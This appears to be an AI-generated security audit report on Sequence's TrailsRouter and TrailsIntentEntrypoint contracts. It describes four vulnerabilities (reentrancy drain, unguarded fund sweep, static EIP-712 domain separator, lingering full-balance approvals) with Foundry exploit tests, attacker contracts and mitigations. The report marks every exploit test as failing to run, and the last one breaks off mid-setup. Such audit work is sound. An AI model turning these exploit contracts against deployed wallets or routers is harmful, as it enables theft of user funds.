# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern

USING MULTI_PATTERN_TO_FINDING_ANALYSIS_MODE = true; and gpt-5
NICHE_PATTERN_ANALYSIS_MODE = false;
NO NEW UNIQUES

 **Derived From** : Reentrancy

[H-1]. Reentrancy in refundAndSweep lets refund recipient steal entire balance and bypass sweep
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : injectAndCall lets anyone drain Router-held ETH/ERC20 due to missing guard

[L-2]. Public injectAndCall lets any EOA drain all ETH/ERC20 held by TrailsRouter
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Static EIP-712 domain separator may break on chainId change

[M-3]. Static DOMAIN_SEPARATOR bricks all new deposits after a chainId change
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Balance injection grants persistent full-balance approvals to arbitrary targets

[H-4]. injectAndCall leaves full-balance ERC20 approvals to arbitrary targets, enabling post-intent wallet drains
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 2
- M: 1
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : Reentrancy

## [H-1]. Reentrancy in refundAndSweep lets refund recipient steal entire balance and bypass sweep

### Finding Severity Justification: If a malicious refund recipient is chosen, they can reenter refundAndSweep during the first transfer and repeatedly drain the entire token/ETH balance from the calling wallet context, preventing any funds from being swept to the intended sweepRecipient. This directly enables theft of arbitrary amounts of assets held by the Sequence wallet / intent context, so the impact is loss of user or protocol funds, which qualifies as High severity under the rubric.
## Derived From Pattern/Invariant
Reentrancy

## Exploit Type
Reentrancy

## Location
TrailsRouter.refundAndSweep

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `refundAndSweep` function is intended to refund up to `_refundAmount` to `_refundRecipient` and sweep the remainder to `_sweepRecipient` (typically a fee collector or protocol address). However, it performs an external call to `_refundRecipient` **before** computing and sending the remaining balance, with no reentrancy guard. A malicious `_refundRecipient` contract can reenter `refundAndSweep` during the first refund transfer and extract the entire balance, preventing any funds from being swept.

Relevant code:

```solidity
function refundAndSweep(address _token, address _refundRecipient, uint256 _refundAmount, address _sweepRecipient)
    public
    payable
    onlyDelegatecall
{
    uint256 current = _getSelfBalance(_token);

    uint256 actualRefund = _refundAmount > current ? current : _refundAmount;
    if (actualRefund != _refundAmount) {
        emit ActualRefund(_token, _refundRecipient, _refundAmount, actualRefund);
    }
    if (actualRefund > 0) {
        if (_token == address(0)) {
            _transferNative(_refundRecipient, actualRefund);
        } else {
            _transferERC20(_token, _refundRecipient, actualRefund);
        }
        emit Refund(_token, _refundRecipient, actualRefund);
    }

    uint256 remaining = _getSelfBalance(_token);
    if (remaining > 0) {
        if (_token == address(0)) {
            _transferNative(_sweepRecipient, remaining);
        } else {
            _transferERC20(_token, _sweepRecipient, remaining);
        }
        emit Sweep(_token, _sweepRecipient, remaining);
    }
}

function _transferNative(address _to, uint256 _amount) internal {
    (bool success,) = payable(_to).call{value: _amount}("");
    if (!success) revert NativeTransferFailed();
}
```

Attack sequence when `_token == address(0)` (native ETH):
1. Assume the calling context (Sequence wallet) holds `current = 100` ETH and `_refundAmount = 50`.
2. `actualRefund` is computed as 50; `_transferNative(_refundRecipient, 50)` sends 50 ETH to a malicious refund recipient contract.
3. In the recipient’s `receive()` function, it reenters and calls `refundAndSweep` again with the same parameters while the outer call is still in progress.
4. The reentrant (inner) call sees `current = 50` (remaining balance), computes `actualRefund = min(50, 50) = 50`, and transfers another 50 ETH to the attacker. The wallet balance becomes 0; `remaining` in the inner call is 0, so no sweep occurs.
5. Returning to the outer call, it continues execution and recomputes `remaining = _getSelfBalance(_token)`, which is now 0. No sweep transfer is made to `_sweepRecipient`.

Net effect: the attacker (refund recipient) receives **100 ETH**, while the sweep recipient gets nothing. This violates the intended invariant that the refund recipient can receive at most `_refundAmount` and that any surplus above `_refundAmount` must go to the sweep recipient.

## Impact
A malicious or user-controlled refund recipient can, via reentrancy on the first refund transfer, repeatedly call refundAndSweep to drain the entire token/ETH balance held in the calling context (Sequence wallet or intent contract), preventing anything from being swept to the intended `_sweepRecipient`. This enables theft of protocol fees or other funds expected to go to a different recipient.

## Command to Run Test


## Proof of Concept
1. Deploy TrailsRouter and a minimal wallet-like contract that delegatecalls `refundAndSweep` (mirroring how Sequence wallets use the router).
2. Fund the wallet with 100 ETH.
3. Deploy a malicious refund-recipient contract whose `receive()` function reenters the wallet and calls `refundAndSweep` again with the same parameters the first time it is called.
4. Call the wallet’s `refundAndSweepViaRouter` wrapper with `_token = address(0)`, `_refundRecipient = attacker`, `_refundAmount = 50 ether`, `_sweepRecipient = feeCollector`.
5. Observe that the attacker receives 100 ETH (two refunds of 50 ETH), the wallet balance goes to 0, and `_sweepRecipient` receives nothing.
6. This shows a concrete theft of funds via reentrancy without any special privileges beyond being designated as refund recipient in the route.

## Proof of Code
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";

// Minimal wallet that delegatecalls refundAndSweep on TrailsRouter
contract WalletRefundMock {
    TrailsRouter public router;

    constructor(TrailsRouter _router) {
        router = _router;
    }

    receive() external payable {}

    function refundAndSweepViaRouter(
        address token,
        address refundRecipient,
        uint256 refundAmount,
        address sweepRecipient
    ) external {
        (bool ok,) = address(router).delegatecall(
            abi.encodeWithSelector(
                TrailsRouter.refundAndSweep.selector,
                token,
                refundRecipient,
                refundAmount,
                sweepRecipient
            )
        );
        require(ok, "delegatecall failed");
    }
}

// Malicious refund recipient that reenters refundAndSweep on first refund
contract ReentrantRefundRecipient {
    WalletRefundMock public wallet;
    bool internal reentered;

    constructor(WalletRefundMock _wallet) {
        wallet = _wallet;
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Reenter with the same parameters: token = native, refundAmount = 50 ether
            wallet.refundAndSweepViaRouter(address(0), address(this), 50 ether, address(0xFEE));
        }
    }
}

contract RefundAndSweepReentrancyTest is Test {
    function test_refundAndSweep_reentrancy_drains_sweep_recipient() public {
        TrailsRouter router = new TrailsRouter();
        WalletRefundMock wallet = new WalletRefundMock(router);

        // Fund the wallet with 100 ETH (simulating funds under Trails control)
        vm.deal(address(wallet), 100 ether);

        ReentrantRefundRecipient attacker = new ReentrantRefundRecipient(wallet);
        address sweepRecipient = address(0xFEE);

        // Single call that should (without reentrancy) send 50 ETH to attacker and 50 ETH to sweepRecipient
        wallet.refundAndSweepViaRouter(address(0), address(attacker), 50 ether, sweepRecipient);

        // After reentrancy:
        // - Wallet balance is zero
        // - Attacker has received the full 100 ETH
        // - Sweep recipient received nothing
        assertEq(address(wallet).balance, 0, "wallet balance should be zero");
        assertEq(address(attacker).balance, 100 ether, "attacker should receive full balance");
        assertEq(sweepRecipient.balance, 0, "sweep recipient should receive nothing");
    }
}


## Suggested Mitigation
Add a reentrancy guard around `refundAndSweep` (and any similar sweep/refund functions):
- Introduce a `uint256 private _locked;` flag and use the standard `nonReentrant` pattern (`require(_locked == 0); _locked = 1; ...; _locked = 0;`).
- Alternatively, use OpenZeppelin’s `ReentrancyGuard` and mark `refundAndSweep` as `nonReentrant`.

Additionally, follow the checks-effects-interactions pattern:
- Perform all balance calculations and state updates **before** making any external calls.
- Where feasible, avoid reentrant-sensitive logic splitting a single balance into refund+remainder; instead, compute both values up front and perform the two transfers with no intermediate points where reentrancy can observe inconsistent balances.

For example:
```solidity
function refundAndSweep(...) public payable onlyDelegatecall nonReentrant {
    uint256 current = _getSelfBalance(_token);
    uint256 actualRefund = _refundAmount > current ? current : _refundAmount;
    uint256 remaining = current - actualRefund;

    if (actualRefund > 0) { _transfer...(_refundRecipient, actualRefund); }
    if (remaining > 0) { _transfer...(_sweepRecipient, remaining); }
}
```





 **Derived From** : injectAndCall lets anyone drain Router-held ETH/ERC20 due to missing guard

## [L-2]. Public injectAndCall lets any EOA drain all ETH/ERC20 held by TrailsRouter

### Finding Severity Justification: The reported behavior is real: injectAndCall is publicly callable, reads the contract’s own balances via _getSelfBalance, and can forward all native/erc20 balance to an arbitrary target. However, the TrailsRouter is explicitly designed as a stateless singleton that is not intended to custody user funds; user assets live in Sequence wallets / intent contracts. Any ETH or tokens at the router address are from mis-sends, tests, or operational dust, and the protocol design already warns that stray funds at helper contracts can be swept by 3rd parties. The impact is therefore limited to accidental deposits to the router, not loss of properly-routed user funds. According to the C4 rubric, issues relying on user mistakes (sending funds directly to a helper singleton) are QA/Low rather than Medium/High.
## Derived From Pattern/Invariant
injectAndCall lets anyone drain Router-held ETH/ERC20 due to missing guard

## Exploit Type
AccessControl

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The TrailsRouter exposes `injectAndCall` as a public function without any access control or delegatecall restriction, but it operates on the contract’s **own** balances via `_getSelfBalance(token)` and then forwards those balances to an arbitrary `target`.

Relevant code:

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) {
        if (token == address(0)) {
            revert NoEthAvailable();
        } else {
            revert NoTokensToSweep();
        }
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}
```

`_getSelfBalance(token)` returns `address(this).balance` for ETH or `IERC20(token).balanceOf(address(this))` for ERC20, i.e. the **Router’s own** holdings, not the caller’s.

Inside `_injectAndExecuteCall`:

```solidity
if (token == address(0)) {
    (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
    ...
} else {
    IERC20 erc20 = IERC20(token);
    SafeERC20.forceApprove(erc20, target, callerBalance);

    (bool success, bytes memory result) = target.call(callData);
    ...
}
```

This means:
- For ETH, `injectAndCall` sends **all ETH held by TrailsRouter** to `target`.
- For ERC20, it first grants `target` an allowance for the Router’s entire token balance, then calls arbitrary code on `target`. If `target` is the token contract itself, `callData` can be a `transfer(attacker, amount)` call, transferring tokens directly from the Router’s balance.

There is no `onlyDelegatecall` modifier on `injectAndCall`, so any external account can call it directly on the deployed TrailsRouter singleton. Any ETH or ERC20 tokens left on the Router (e.g. from previous routes, mis-sent funds, or accounting dust) are thus freely withdrawable by the first malicious caller.

## Impact
Any ETH or ERC20 tokens residing on the TrailsRouter singleton (from mis-sends, dust, or previous routes) can be completely drained to an arbitrary address by any EOA, resulting in direct theft of those assets.

## Command to Run Test


## Proof of Concept
1. Assume, due to a previous operation or user mistake, the TrailsRouter contract at its singleton address holds some ETH and an ERC20 token balance.
2. An attacker monitors the Router address and detects that it now has non-zero balances.
3. To steal ETH:
   - The attacker calls `injectAndCall(address(0), attackerAddress, "", 0, bytes32(0))`.
   - `_getSelfBalance(address(0))` reads the Router’s entire ETH balance.
   - `_injectAndExecuteCall` executes `target.call{value: callerBalance}("")`, sending all ETH to `attackerAddress`.
4. To steal ERC20 tokens:
   - Let `token` be the ERC20 contract address, and `amount` be `IERC20(token).balanceOf(address(router))`.
   - The attacker calls `injectAndCall(token, token, abi.encodeWithSelector(ERC20.transfer.selector, attackerAddress, amount), 0, bytes32(0))`.
   - `_getSelfBalance(token)` returns the Router’s full token balance.
   - `_injectAndExecuteCall` first does `token.approve(token, amount)` (irrelevant here) and then low-level calls `token.call(callData)`.
   - Inside the token, `transfer(attackerAddress, amount)` is executed with `msg.sender == TrailsRouter`, so the transfer moves tokens from the Router’s balance to the attacker.
5. The Router has no owner or recovery mechanism; once drained, these funds are irrecoverable.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract TrailsRouterInjectAndCallExploitTest is Test {
    TrailsRouter router;
    MockToken token;
    address victim = address(0xBEEF);
    address attacker = address(0xBAD);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockToken();

        // Fund victim with ETH and tokens
        vm.deal(victim, 10 ether);
        token.mint(victim, 100 ether);

        // Victim accidentally sends ETH and tokens to the router contract
        vm.prank(victim);
        (bool ok,) = address(router).call{value: 1 ether}("");
        require(ok, "eth transfer failed");

        vm.prank(victim);
        token.transfer(address(router), 100 ether);
    }

    function testExploitDrainEthAndTokensViaInjectAndCall() public {
        // Attacker drains ETH held by TrailsRouter
        uint256 routerEthBefore = address(router).balance;
        uint256 attackerEthBefore = attacker.balance;

        vm.prank(attacker);
        router.injectAndCall(address(0), attacker, "", 0, bytes32(0));

        assertEq(address(router).balance, 0, "router ETH drained");
        assertEq(attacker.balance, attackerEthBefore + routerEthBefore, "attacker received ETH");

        // Attacker drains ERC20 tokens held by TrailsRouter
        uint256 routerTokenBal = token.balanceOf(address(router));

        vm.prank(attacker);
        router.injectAndCall(
            address(token),
            address(token),
            abi.encodeWithSelector(token.transfer.selector, attacker, routerTokenBal),
            0,
            bytes32(0)
        );

        assertEq(token.balanceOf(address(router)), 0, "router tokens drained");
        assertEq(token.balanceOf(attacker), routerTokenBal, "attacker received tokens");
    }
}


## Suggested Mitigation
If `injectAndCall` is intended **only** for delegatecall usage inside Sequence wallets, restrict it with the same guard as the other wallet-only helpers:

```solidity
function injectAndCall(...) public payable onlyDelegatecall { ... }
```

and route delegated calls through the existing `_injectAndCallDelegated` helper.

If a standalone, non-delegatecall variant is desired, it should operate on the **caller’s** balance instead of the Router’s self balance, mirroring `injectSweepAndCall`:

```solidity
uint256 callerBalance = _getBalance(token, msg.sender);
```

Additionally, consider removing or severely limiting any functions that can forward the contract’s **entire** ETH/token balance to arbitrary targets, or at least gating them behind privileged roles if they are strictly for maintenance/recovery.





 **Derived From** : Static EIP-712 domain separator may break on chainId change

## [M-3]. Static DOMAIN_SEPARATOR bricks all new deposits after a chainId change

### Finding Severity Justification: If the underlying chain’s chainId ever changes after deployment (e.g. L2 migration or hard fork that bumps chainId), all new EIP‑712 signatures produced by standard tooling will be invalid for this contract. That permanently prevents new deposits via depositToIntent / depositToIntentWithPermit on that chain unless integrators deliberately override EIP‑712 domain chainId off‑spec. This is a full loss of protocol availability for the entrypoint on that chain, but it does not directly cause loss or theft of user funds; it is a denial of service on a core function. Under the C4 rubric, that fits as a Medium: protocol function and value flow are impacted, while assets themselves are not stolen.
## Derived From Pattern/Invariant
Static EIP-712 domain separator may break on chainId change

## Exploit Type
StandardViolation

## Location
TrailsIntentEntrypoint.constructor / _verifyAndMarkIntent

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsIntentEntrypoint computes the EIP-712 DOMAIN_SEPARATOR once in the constructor using the then-current block.chainid and stores it immutable:

- In the constructor:
  - `DOMAIN_SEPARATOR = keccak256(abi.encode(keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"), keccak256(bytes("TrailsIntentEntrypoint")), keccak256(bytes(VERSION)), block.chainid, address(this)));`

At verification time, the typed data struct for the intent includes a `chainId` field, which is dynamically populated from `chainid()`:

```solidity
bytes32 _typehash = TRAILS_INTENT_TYPEHASH;
bytes32 intentHash;
// keccak256(abi.encode(TRAILS_INTENT_TYPEHASH, user, token, amount, intentAddress, deadline, chainId, nonce, feeAmount, feeCollector));
assembly {
    let ptr := mload(0x40)
    mstore(ptr, _typehash)
    mstore(add(ptr, 0x20), user)
    mstore(add(ptr, 0x40), token)
    mstore(add(ptr, 0x60), amount)
    mstore(add(ptr, 0x80), intentAddress)
    mstore(add(ptr, 0xa0), deadline)
    mstore(add(ptr, 0xc0), chainid())        // dynamic chainId in struct
    mstore(add(ptr, 0xe0), nonce)
    mstore(add(ptr, 0x100), feeAmount)
    mstore(add(ptr, 0x120), feeCollector)
    intentHash := keccak256(ptr, 0x140)
}

bytes32 _domainSeparator = DOMAIN_SEPARATOR;
bytes32 digest;
assembly {
    let ptr := mload(0x40)
    mstore(ptr, 0x1901)
    mstore(add(ptr, 0x20), _domainSeparator) // static DOMAIN_SEPARATOR (old chainId)
    mstore(add(ptr, 0x40), intentHash)
    digest := keccak256(add(ptr, 0x1e), 0x42)
}
```

If the underlying chain’s `chainid` changes (e.g., L2 upgrade, hard fork with new chainId):
- The contract’s immutable `DOMAIN_SEPARATOR` still encodes the *old* chainId.
- `_verifyAndMarkIntent` uses the *new* `chainid()` when filling the `chainId` field in the struct.
- Off-chain tooling (ethers.js, viem, etc.) will typically build the EIP-712 domain using the *current* chainId (the new one).

As a result, the off-chain digest is:
- `digest_off = keccak256("\x19\x01" || domain(chainId = new) || intentHash(chainId = new))`,

while the on-chain digest is:
- `digest_on = keccak256("\x19\x01" || DOMAIN_SEPARATOR(chainId = old) || intentHash(chainId = new))`.

These digests differ, so a user signature over `digest_off` never validates against `digest_on`. Every call to `depositToIntent` / `depositToIntentWithPermit` will revert with `InvalidIntentSignature()` for intents signed after the chainId change. This is a StandardViolation of the usual EIP-712 pattern (e.g., OpenZeppelin EIP712) which updates or recomputes the domain separator when `chainid` changes, and it yields a chain-wide DoS of intent deposits on any chain that ever changes its chainId.

## Impact
If the chainId of the underlying network ever changes after deployment, all future calls to depositToIntent and depositToIntentWithPermit using standard EIP-712 tooling will revert with InvalidIntentSignature. No user can submit new intents through this entrypoint without hard-coding the old chainId into their off-chain domain construction, effectively bricking the protocol’s deposit layer on that chain and blocking new flows.

## Command to Run Test


## Proof of Concept
1. Assume TrailsIntentEntrypoint is deployed when `block.chainid == 1`. The constructor computes and stores `DOMAIN_SEPARATOR` with `chainId = 1`.
2. Later, the L2 or chain is upgraded such that `block.chainid == 2`. The contract’s immutable `DOMAIN_SEPARATOR` still encodes `chainId = 1`.
3. A user wishes to deposit after this upgrade. Their wallet / dApp builds EIP-712 typed data using standard libraries (e.g. ethers.js), which use the *current* `chainId = 2` in the EIP-712 domain. The message struct also includes a `chainId` field set to 2.
4. The user signs `digest_off = keccak256("\x19\x01" || domain(chainId = 2) || intentHash(chainId = 2))` and sends the signature to `depositToIntent` (or `depositToIntentWithPermit`).
5. On-chain, `_verifyAndMarkIntent` recomputes `intentHash` using `chainid()` which now returns 2, but uses the immutable `DOMAIN_SEPARATOR` that still encodes `chainId = 1`. It computes `digest_on = keccak256("\x19\x01" || domain(chainId = 1) || intentHash(chainId = 2))`.
6. Because `digest_on != digest_off`, `ECDSA.recover(digest_on, sig)` does not equal `user`, so the contract reverts with `InvalidIntentSignature()`.
7. This failure occurs for all new intents created after the chainId change (unless off-chain code is specially modified to force `chainId = 1` in the domain), causing a permanent DoS of the entrypoint on that chain.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsIntentEntrypoint} from "src/TrailsIntentEntrypoint.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor(address initialHolder) ERC20("Mock", "MCK") {
        _mint(initialHolder, 1e24);
    }
}

contract TrailsIntentEntrypointChainIdTest is Test {
    TrailsIntentEntrypoint internal entry;
    MockToken internal token;
    uint256 internal userPk;
    address internal user;

    function setUp() public {
        uint256 initialChainId = 1;
        vm.chainId(initialChainId);
        entry = new TrailsIntentEntrypoint();

        userPk = 0xA11CE;
        user = vm.addr(userPk);

        token = new MockToken(user);
    }

    function _signIntent(
        uint256 domainChainId,
        uint256 structChainId,
        uint256 nonce,
        uint256 amount,
        uint256 deadline,
        uint256 feeAmount,
        address feeCollector,
        address intentAddress
    ) internal view returns (uint8 v, bytes32 r, bytes32 s) {
        bytes32 typehash = entry.TRAILS_INTENT_TYPEHASH();
        bytes32 intentHash = keccak256(
            abi.encode(
                typehash,
                user,
                address(token),
                amount,
                intentAddress,
                deadline,
                structChainId,
                nonce,
                feeAmount,
                feeCollector
            )
        );

        bytes32 domainSeparator = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("TrailsIntentEntrypoint")),
                keccak256(bytes(entry.VERSION())),
                domainChainId,
                address(entry)
            )
        );

        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, intentHash));
        (v, r, s) = vm.sign(userPk, digest);
    }

    function testDepositRevertsAfterChainIdChangeDueToStaticDomainSeparator() public {
        uint256 newChainId = 2;
        uint256 amount = 100e18;
        uint256 feeAmount = 0;
        address feeCollector = address(0);
        address intentAddress = address(0x1234);
        uint256 deadline = block.timestamp + 1 days;
        uint256 nonce = 0;

        // Simulate a chain upgrade that changes chainId
        vm.chainId(newChainId);

        // User approves the entrypoint to pull tokens
        vm.prank(user);
        token.approve(address(entry), amount);

        (uint8 v, bytes32 r, bytes32 s) = _signIntent(
            newChainId,
            newChainId,
            nonce,
            amount,
            deadline,
            feeAmount,
            feeCollector,
            intentAddress
        );

        vm.prank(address(0xBEEF));
        vm.expectRevert(TrailsIntentEntrypoint.InvalidIntentSignature.selector);
        entry.depositToIntent(
            user,
            address(token),
            amount,
            intentAddress,
            deadline,
            nonce,
            feeAmount,
            feeCollector,
            v,
            r,
            s
        );
    }
}


## Suggested Mitigation
Follow the dynamic domain separator pattern used by OpenZeppelin’s EIP712 implementation so that the domain’s chainId matches the current chainId at verification time. Concretely:
- Store the name, version, and initial chainId in immutable variables or constants, but do *not* store a precomputed DOMAIN_SEPARATOR.
- Replace the immutable `DOMAIN_SEPARATOR` with a function that recomputes the domain separator when `chainid()` differs from the cached value, e.g.:
  - Keep `uint256 private immutable _CACHED_CHAIN_ID; bytes32 private immutable _CACHED_DOMAIN_SEPARATOR;` set in the constructor.
  - Implement `function _domainSeparator() internal view returns (bytes32) { if (block.chainid == _CACHED_CHAIN_ID) return _CACHED_DOMAIN_SEPARATOR; return keccak256(abi.encode(TYPE_HASH, NAME_HASH, VERSION_HASH, block.chainid, address(this))); }`.
- In `_verifyAndMarkIntent`, use this `_domainSeparator()` view function instead of the immutable `DOMAIN_SEPARATOR` value.

Alternatively, if you want the chainId to be encoded only once, remove the `chainId` field from the struct and rely solely on the domain’s chainId, but still recompute the domain separator dynamically when the chainId changes.





 **Derived From** : Balance injection grants persistent full-balance approvals to arbitrary targets

## [H-4]. injectAndCall leaves full-balance ERC20 approvals to arbitrary targets, enabling post-intent wallet drains

### Finding Severity Justification: The report correctly identifies that _injectAndExecuteCall approves the target for the caller’s entire ERC20 balance (callerBalance) and never revokes or re-scopes that approval. In the primary intended usage (delegatecall via Sequence wallets), address(this) is the wallet, so this creates a standing allowance from the wallet to an arbitrary target contract chosen per route. If that target spends only part of the approved balance during the intended call, it retains the remaining allowance indefinitely and can later call transferFrom to drain the user’s remaining tokens without any new signature or intent. This is a direct, unbounded asset theft vector based on a realistic flow (arbitrary target integrations via Trails), so it qualifies as High severity under the rubric (assets can be directly stolen with a realistic attack path).
## Derived From Pattern/Invariant
Balance injection grants persistent full-balance approvals to arbitrary targets

## Exploit Type
AuthByPass

## Location
TrailsRouter._injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In TrailsRouter, both injectAndCall (wallet/delegatecall mode) and injectSweepAndCall (standalone mode) route through _injectAndExecuteCall, which grants a full-balance ERC20 approval to an arbitrary target and never revokes it.

Core code in TrailsRouter._injectAndExecuteCall:

    function _injectAndExecuteCall(
        address token,
        address target,
        bytes memory callData,
        uint256 amountOffset,
        bytes32 placeholder,
        uint256 callerBalance
    ) internal {
        ...
        if (token == address(0)) {
            (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
            ...
        } else {
            IERC20 erc20 = IERC20(token);
            SafeERC20.forceApprove(erc20, target, callerBalance);

            (bool success, bytes memory result) = target.call(callData);
            ...
        }
    }

In delegatecall context (Sequence wallet → TrailsRouterShim → TrailsRouter), _getSelfBalance(token) returns the wallet's token balance, and the approve() is executed with msg.sender == the wallet. This sets allowance[wallet][target] = callerBalance, where callerBalance is the wallet's entire balance of that token at the time. There is no post-call reset of this allowance and no restriction that target must spend all of it during the injected call.

A target that uses only part of the allowance (e.g. consumes half the balance as part of the orchestrated swap/bridge) leaves the remainder as a live approval from the wallet to itself. At any later time, that target (or an attacker who controls/compromises it) can call token.transferFrom(wallet, attacker, remaining) to drain the rest of the wallet's tokens, without any new Sequence/Trails signature or opHash.

Because target is fully user-/route-controlled (no on-chain allowlist) and may be an upgradable or third-party protocol, this breaks Trails' intended "intent-scoped" authorisation boundary: a single injected call can leave behind powerful, persistent approvals that enable unrestricted future withdrawals by the target, long after the original intent has completed.

## Impact
Any ERC20 tokens held by a Sequence wallet (when using TrailsRouter via delegatecall) can be drained by any contract that was previously used as a balance-injection target, up to the remaining allowance. The drain can happen arbitrarily long after the original intent, without any new user signature, bypassing Trails/Sequence opHash and Merkle-tree authorisation. In standalone use of TrailsRouter, any ERC20s held by the router contract itself are similarly exposed via persistent approvals to prior targets.

## Command to Run Test


## Proof of Concept
Scenario (Sequence-like wallet context):

1) Deploy TrailsRouter and a simple WalletLike contract that delegates into TrailsRouter:
   - WalletLike stores a TrailsRouter instance and has runInjectAndCall(token, target, callData) which delegatecalls router.injectAndCall(...).
   - Because of delegatecall, inside TrailsRouter address(this) == WalletLike, so approvals are granted from the wallet, not the router.

2) Deploy a MockERC20 token and mint 1000 tokens to WalletLike.

3) Deploy MaliciousTarget with references to (token, victimWallet = WalletLike, attacker EOA). MaliciousTarget has:
   - consumeHalf(): reads token.allowance(victimWallet, address(this)), transfers half of that from victimWallet to itself via transferFrom.
   - drain(): later, reads the remaining allowance and executes transferFrom(victimWallet, attacker, remaining).

4) Call wallet.runInjectAndCall(token, MaliciousTarget, abi.encodeWithSelector(MaliciousTarget.consumeHalf.selector)).
   - Inside router._injectAndExecuteCall (delegatecall context):
     a) callerBalance = token.balanceOf(WalletLike) = 1000.
     b) forceApprove(token, MaliciousTarget, 1000) executes in wallet context, so allowance[WalletLike][MaliciousTarget] = 1000.
     c) target.call(callData) invokes MaliciousTarget.consumeHalf(), which transfers 500 tokens from WalletLike to MaliciousTarget and reduces the allowance to 500.
   - After the call, WalletLike holds 500 tokens, MaliciousTarget holds 500, and allowance[WalletLike][MaliciousTarget] == 500.

5) At any later time, the attacker calls MaliciousTarget.drain().
   - drain() reads the still-live allowance (500) and calls token.transferFrom(WalletLike, attacker, 500), draining the remaining wallet balance without any new intent or signature.

6) Final state: WalletLike's balance is 0; MaliciousTarget still has 500 tokens from the legitimate operation; attacker has stolen the remaining 500. The second transferFrom is not covered by the original Trails/Sequence intent; it is enabled solely by the persistent approval left behind by _injectAndExecuteCall.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";

contract MockERC20 {
    string public constant name = "Mock";
    string public constant symbol = "MOCK";
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        require(balanceOf[from] >= amount, "bal");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract MaliciousTarget {
    MockERC20 public immutable token;
    address public immutable victimWallet;
    address public immutable attacker;

    constructor(MockERC20 _token, address _victimWallet, address _attacker) {
        token = _token;
        victimWallet = _victimWallet;
        attacker = _attacker;
    }

    // Called via TrailsRouter._injectAndExecuteCall
    function consumeHalf() external {
        uint256 allowed = token.allowance(victimWallet, address(this));
        uint256 half = allowed / 2;
        if (half > 0) {
            token.transferFrom(victimWallet, address(this), half);
        }
    }

    // Called later by the attacker to drain remaining allowance
    function drain() external {
        uint256 remaining = token.allowance(victimWallet, address(this));
        if (remaining > 0) {
            token.transferFrom(victimWallet, attacker, remaining);
        }
    }
}

contract WalletLike {
    TrailsRouter public router;

    constructor(TrailsRouter _router) {
        router = _router;
    }

    // Minimal Sequence-like wallet that delegatecalls into TrailsRouter.injectAndCall
    function runInjectAndCall(address token, address target, bytes calldata callData) external {
        (bool ok, ) = address(router).delegatecall(
            abi.encodeWithSelector(
                router.injectAndCall.selector,
                token,
                target,
                callData,
                0,          // amountOffset
                bytes32(0)  // placeholder
            )
        );
        require(ok, "injectAndCall failed");
    }
}

contract TrailsRouter_PersistentApproval_Test is Test {
    TrailsRouter router;
    WalletLike wallet;
    MockERC20 token;
    MaliciousTarget target;
    address attacker = address(0xA11CE);

    function setUp() public {
        router = new TrailsRouter();
        wallet = new WalletLike(router);
        token = new MockERC20();
        // Fund the wallet with 1000 tokens
        token.mint(address(wallet), 1000 ether);
